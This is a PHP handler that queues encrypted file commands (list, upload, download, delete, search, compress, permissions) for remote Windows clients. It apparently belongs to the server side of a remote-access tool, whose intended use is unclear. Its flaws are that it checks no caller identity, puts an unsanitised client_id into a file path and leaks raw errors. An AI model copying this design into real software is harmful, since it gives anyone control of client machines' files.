<?php

namespace Handlers;

use Services\LoggerService;
use Services\EncryptionService;
use \Config;
use PDO;

require_once __DIR__ . '/../../config.php';

class FileManagerHandler
{
    private $pdo;
    private $logger;
    private $encryption;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
        $this->logger = new LoggerService();
        $this->encryption = new EncryptionService($this->logger);
    }

    public function handle(array $input)
    {
        header('Content-Type: application/json');
        $data = array_merge($input, $_POST);

        $action = $data['action'] ?? null;
        $clientId = $data['client_id'] ?? null;

        if (!$action || !$clientId) {
            http_response_code(400);
            $this->logger->logError("FileManager: Missing action or client_id");
            die(json_encode(['error' => 'Missing action or client_id']));
        }

        $this->logger->logWebhook("FileManager action: $action for client: $clientId");

        switch ($action) {
            case 'file_list':
                return $this->handleFileList($clientId, $data);
            case 'file_download':
                return $this->handleFileDownload($clientId, $data);
            case 'file_upload':
                return $this->handleFileUpload($clientId, $data);
            case 'file_delete':
                return $this->handleFileDelete($clientId, $data);
            case 'file_create':
                return $this->handleFileCreate($clientId, $data);
            case 'file_rename':
                return $this->handleFileRename($clientId, $data);
            case 'file_copy':
                return $this->handleFileCopy($clientId, $data);
            case 'file_move':
                return $this->handleFileMove($clientId, $data);
            case 'file_search':
                return $this->handleFileSearch($clientId, $data);
            case 'file_compress':
                return $this->handleFileCompress($clientId, $data);
            case 'file_extract':
                return $this->handleFileExtract($clientId, $data);
            case 'file_properties':
                return $this->handleFileProperties($clientId, $data);
            case 'file_preview':
                return $this->handleFilePreview($clientId, $data);
            case 'file_hash':
                return $this->handleFileHash($clientId, $data);
            case 'file_duplicates':
                return $this->handleFileDuplicates($clientId, $data);
            case 'file_statistics':
                return $this->handleFileStatistics($clientId, $data);
            case 'file_permissions':
                return $this->handleFilePermissions($clientId, $data);
            default:
                $this->logger->logError("Unknown file manager action: $action");
                return ['error' => 'Unknown action'];
        }
    }

    private function handleFileList(string $clientId, array $data): array
    {
        try {
            $path = $this->encryption->decrypt($data['path'] ?? '');
            $path = $path ?: 'C:\\';
            $page = (int)($data['page'] ?? 1);
            $pageSize = min((int)($data['page_size'] ?? 50), 200);
            $sort = $data['sort'] ?? 'name';
            $order = $data['order'] ?? 'asc';
            $showHidden = filter_var($data['show_hidden'] ?? false, FILTER_VALIDATE_BOOLEAN);

            $this->logger->logWebhook("File list requested: $path, page: $page");

            // صف کردن دستور برای کلاینت
            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'list',
                    'path' => $path,
                    'page' => $page,
                    'page_size' => $pageSize,
                    'sort' => $sort,
                    'order' => $order,
                    'show_hidden' => $showHidden
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);
            
            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'pending',
                    'command_id' => $response['command_id'],
                    'message' => 'File list command queued'
                ];
            } else {
                return ['error' => 'Failed to queue command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File list failed: " . $e->getMessage());
            return ['error' => 'File list failed: ' . $e->getMessage()];
        }
    }

    private function handleFileUpload(string $clientId, array $data): array
    {
        try {
            $this->logger->logWebhook("File upload started for client: $clientId");

            // بررسی فایل آپلود شده
            if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
                $error = $_FILES['file']['error'] ?? 'No file uploaded';
                $this->logger->logError("File upload error: $error");
                return ['error' => 'File upload failed: ' . $this->getUploadError($error)];
            }

            $file = $_FILES['file'];
            $targetPath = $this->encryption->decrypt($data['path'] ?? '');
            $chunkIndex = (int)($data['chunk_index'] ?? 0);
            $totalChunks = (int)($data['total_chunks'] ?? 1);
            $fileHash = $data['file_hash'] ?? '';

            // ذخیره موقت chunk
            $tempDir = Config::$UPLOAD_DIR . 'temp/' . $clientId . '/';
            if (!is_dir($tempDir)) {
                mkdir($tempDir, 0755, true);
            }

            $tempFile = $tempDir . basename($file['name']) . ".part$chunkIndex";
            if (!move_uploaded_file($file['tmp_name'], $tempFile)) {
                return ['error' => 'Failed to save chunk'];
            }

            // اگر آخرین chunk است، دستور را صف کن
            if ($chunkIndex === $totalChunks - 1) {
                $commandData = [
                    'type' => 'file_operation',
                    'params' => [
                        'action' => 'upload',
                        'temp_dir' => $tempDir,
                        'target_path' => $targetPath,
                        'filename' => basename($file['name']),
                        'file_size' => $file['size'],
                        'total_chunks' => $totalChunks,
                        'file_hash' => $fileHash
                    ]
                ];

                $response = $this->queueCommand($clientId, $commandData);

                if (isset($response['status']) && $response['status'] === 'success') {
                    return [
                        'status' => 'success',
                        'command_id' => $response['command_id'],
                        'message' => 'Upload completed, command queued',
                        'uploaded_bytes' => $file['size'],
                        'total_bytes' => $file['size'] * $totalChunks
                    ];
                }
            }

            return [
                'status' => 'success',
                'message' => 'Chunk uploaded successfully',
                'chunk_index' => $chunkIndex,
                'next_chunk' => $chunkIndex + 1
            ];
        } catch (\Exception $e) {
            $this->logger->logError("File upload failed: " . $e->getMessage());
            return ['error' => 'Upload failed: ' . $e->getMessage()];
        }
    }

    private function handleFileDownload(string $clientId, array $data): array
    {
        try {
            $filePath = $this->encryption->decrypt($data['path'] ?? '');
            $offset = (int)($data['offset'] ?? 0);
            $chunkSize = min((int)($data['chunk_size'] ?? 1048576), 10485760); // حداکثر 10MB

            if (!$filePath) {
                return ['error' => 'File path required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'download',
                    'path' => $filePath,
                    'offset' => $offset,
                    'chunk_size' => $chunkSize
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'pending',
                    'command_id' => $response['command_id'],
                    'message' => 'Download command queued'
                ];
            } else {
                return ['error' => 'Failed to queue download command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File download failed: " . $e->getMessage());
            return ['error' => 'Download failed: ' . $e->getMessage()];
        }
    }

    private function handleFileDelete(string $clientId, array $data): array
    {
        try {
            $paths = json_decode($this->encryption->decrypt($data['paths'] ?? '[]'), true) ?: [];

            if (empty($paths)) {
                return ['error' => 'No files specified for deletion'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'delete',
                    'paths' => $paths
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Delete command queued',
                    'count' => count($paths)
                ];
            } else {
                return ['error' => 'Failed to queue delete command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File delete failed: " . $e->getMessage());
            return ['error' => 'Delete failed: ' . $e->getMessage()];
        }
    }

    private function handleFileCreate(string $clientId, array $data): array
    {
        try {
            $path = $this->encryption->decrypt($data['path'] ?? '');
            $type = $data['type'] ?? 'file'; // file or folder

            if (!$path) {
                return ['error' => 'Path required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'create',
                    'path' => $path,
                    'type' => $type
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => ucfirst($type) . ' creation queued'
                ];
            } else {
                return ['error' => 'Failed to queue creation command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File create failed: " . $e->getMessage());
            return ['error' => 'Create failed: ' . $e->getMessage()];
        }
    }

    private function handleFileRename(string $clientId, array $data): array
    {
        try {
            $oldPath = $this->encryption->decrypt($data['old_path'] ?? '');
            $newPath = $this->encryption->decrypt($data['new_path'] ?? '');

            if (!$oldPath || !$newPath) {
                return ['error' => 'Both old and new paths required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'rename',
                    'old_path' => $oldPath,
                    'new_path' => $newPath
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Rename command queued'
                ];
            } else {
                return ['error' => 'Failed to queue rename command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File rename failed: " . $e->getMessage());
            return ['error' => 'Rename failed: ' . $e->getMessage()];
        }
    }

    private function handleFileCopy(string $clientId, array $data): array
    {
        try {
            $sourcePath = $this->encryption->decrypt($data['source_path'] ?? '');
            $destPath = $this->encryption->decrypt($data['dest_path'] ?? '');

            if (!$sourcePath || !$destPath) {
                return ['error' => 'Both source and destination paths required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'copy',
                    'source_path' => $sourcePath,
                    'dest_path' => $destPath
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Copy command queued'
                ];
            } else {
                return ['error' => 'Failed to queue copy command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File copy failed: " . $e->getMessage());
            return ['error' => 'Copy failed: ' . $e->getMessage()];
        }
    }

    private function handleFileMove(string $clientId, array $data): array
    {
        try {
            $sourcePath = $this->encryption->decrypt($data['source_path'] ?? '');
            $destPath = $this->encryption->decrypt($data['dest_path'] ?? '');

            if (!$sourcePath || !$destPath) {
                return ['error' => 'Both source and destination paths required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'move',
                    'source_path' => $sourcePath,
                    'dest_path' => $destPath
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Move command queued'
                ];
            } else {
                return ['error' => 'Failed to queue move command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File move failed: " . $e->getMessage());
            return ['error' => 'Move failed: ' . $e->getMessage()];
        }
    }

    private function handleFileSearch(string $clientId, array $data): array
    {
        try {
            $rootPath = $this->encryption->decrypt($data['root_path'] ?? 'C:\\');
            $pattern = $this->encryption->decrypt($data['pattern'] ?? '*');
            $searchType = $data['search_type'] ?? 'both'; // files, folders, both
            $maxResults = min((int)($data['max_results'] ?? 100), 1000);

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'search',
                    'root_path' => $rootPath,
                    'pattern' => $pattern,
                    'search_type' => $searchType,
                    'max_results' => $maxResults
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Search command queued'
                ];
            } else {
                return ['error' => 'Failed to queue search command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File search failed: " . $e->getMessage());
            return ['error' => 'Search failed: ' . $e->getMessage()];
        }
    }

    private function handleFileCompress(string $clientId, array $data): array
    {
        try {
            $paths = json_decode($this->encryption->decrypt($data['paths'] ?? '[]'), true) ?: [];
            $archiveName = $this->encryption->decrypt($data['archive_name'] ?? 'archive.zip');
            $format = $data['format'] ?? 'zip'; // zip or tar

            if (empty($paths)) {
                return ['error' => 'No files specified for compression'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'compress',
                    'paths' => $paths,
                    'archive_name' => $archiveName,
                    'format' => $format
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Compress command queued'
                ];
            } else {
                return ['error' => 'Failed to queue compress command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File compress failed: " . $e->getMessage());
            return ['error' => 'Compress failed: ' . $e->getMessage()];
        }
    }

    private function handleFileExtract(string $clientId, array $data): array
    {
        try {
            $archivePath = $this->encryption->decrypt($data['archive_path'] ?? '');
            $destPath = $this->encryption->decrypt($data['dest_path'] ?? '');

            if (!$archivePath) {
                return ['error' => 'Archive path required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'extract',
                    'archive_path' => $archivePath,
                    'dest_path' => $destPath
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Extract command queued'
                ];
            } else {
                return ['error' => 'Failed to queue extract command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File extract failed: " . $e->getMessage());
            return ['error' => 'Extract failed: ' . $e->getMessage()];
        }
    }

    private function handleFileProperties(string $clientId, array $data): array
    {
        try {
            $path = $this->encryption->decrypt($data['path'] ?? '');

            if (!$path) {
                return ['error' => 'Path required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'properties',
                    'path' => $path
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Properties command queued'
                ];
            } else {
                return ['error' => 'Failed to queue properties command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File properties failed: " . $e->getMessage());
            return ['error' => 'Properties failed: ' . $e->getMessage()];
        }
    }

    private function handleFilePreview(string $clientId, array $data): array
    {
        try {
            $path = $this->encryption->decrypt($data['path'] ?? '');
            $previewType = $data['type'] ?? 'text'; // text or image

            if (!$path) {
                return ['error' => 'Path required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'preview',
                    'path' => $path,
                    'preview_type' => $previewType
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Preview command queued'
                ];
            } else {
                return ['error' => 'Failed to queue preview command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File preview failed: " . $e->getMessage());
            return ['error' => 'Preview failed: ' . $e->getMessage()];
        }
    }

    private function handleFileHash(string $clientId, array $data): array
    {
        try {
            $path = $this->encryption->decrypt($data['path'] ?? '');
            $algorithm = $data['algorithm'] ?? 'md5'; // md5, sha1, sha256

            if (!$path) {
                return ['error' => 'Path required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'hash',
                    'path' => $path,
                    'algorithm' => $algorithm
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Hash calculation queued'
                ];
            } else {
                return ['error' => 'Failed to queue hash command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File hash failed: " . $e->getMessage());
            return ['error' => 'Hash failed: ' . $e->getMessage()];
        }
    }

    private function handleFileDuplicates(string $clientId, array $data): array
    {
        try {
            $rootPath = $this->encryption->decrypt($data['root_path'] ?? 'C:\\');

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'duplicates',
                    'root_path' => $rootPath
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Duplicate search queued'
                ];
            } else {
                return ['error' => 'Failed to queue duplicates command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File duplicates failed: " . $e->getMessage());
            return ['error' => 'Duplicates search failed: ' . $e->getMessage()];
        }
    }

    private function handleFileStatistics(string $clientId, array $data): array
    {
        try {
            $path = $this->encryption->decrypt($data['path'] ?? 'C:\\');

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'statistics',
                    'path' => $path
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Statistics command queued'
                ];
            } else {
                return ['error' => 'Failed to queue statistics command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File statistics failed: " . $e->getMessage());
            return ['error' => 'Statistics failed: ' . $e->getMessage()];
        }
    }

    private function handleFilePermissions(string $clientId, array $data): array
    {
        try {
            $path = $this->encryption->decrypt($data['path'] ?? '');
            $permissions = $data['permissions'] ?? '755';

            if (!$path) {
                return ['error' => 'Path required'];
            }

            $commandData = [
                'type' => 'file_operation',
                'params' => [
                    'action' => 'permissions',
                    'path' => $path,
                    'permissions' => $permissions
                ]
            ];

            $response = $this->queueCommand($clientId, $commandData);

            if (isset($response['status']) && $response['status'] === 'success') {
                return [
                    'status' => 'success',
                    'command_id' => $response['command_id'],
                    'message' => 'Permissions command queued'
                ];
            } else {
                return ['error' => 'Failed to queue permissions command'];
            }
        } catch (\Exception $e) {
            $this->logger->logError("File permissions failed: " . $e->getMessage());
            return ['error' => 'Permissions failed: ' . $e->getMessage()];
        }
    }

    private function queueCommand(string $clientId, array $commandData): array
    {
        try {
            $encryptedCommand = $this->encryption->encrypt(json_encode($commandData));

            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);

            $commandId = $this->pdo->lastInsertId();
            $this->logger->logWebhook("File command queued: ID=$commandId, Type={$commandData['type']}");

            return ['status' => 'success', 'command_id' => $commandId];
        } catch (\PDOException $e) {
            $this->logger->logError("Error queuing file command: " . $e->getMessage());
            return ['error' => 'Error queuing command: ' . $e->getMessage()];
        }
    }

    private function getUploadError(int $errorCode): string
    {
        $errors = [
            UPLOAD_ERR_INI_SIZE => 'The uploaded file exceeds the upload_max_filesize directive in php.ini',
            UPLOAD_ERR_FORM_SIZE => 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form',
            UPLOAD_ERR_PARTIAL => 'The uploaded file was only partially uploaded',
            UPLOAD_ERR_NO_FILE => 'No file was uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing a temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'A PHP extension stopped the file upload',
        ];

        return $errors[$errorCode] ?? "Unknown upload error ($errorCode)";
    }
}